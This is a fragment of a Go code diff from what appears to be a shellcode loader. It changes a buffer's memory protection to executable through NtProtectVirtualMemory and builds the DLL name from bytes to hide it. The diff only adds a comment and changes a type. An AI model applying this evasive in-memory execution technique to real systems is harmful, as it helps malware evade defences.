@@ -9,10 +9,20 @@ const (
 	PAGE_EXECUTE_READ uintptr = 0x20
 )
 
+/*
+NTSTATUS
+NtProtectVirtualMemory(
+  IN HANDLE,
+  IN OUT PVOID*,
+  IN OUT SIZE_T*,
+  IN ULONG,
+  OUT PULONG
+)
+*/
 func X(buf []byte) {
 	var hProcess uintptr = 0
 	var pBaseAddr = uintptr(unsafe.Pointer(&buf[0]))
-	var dwBufferLen = uint32(len(buf))
+	var dwBufferLen = uint(len(buf))
 	var dwOldPerm uint32
 
 	syscall.NewLazyDLL(string([]byte{
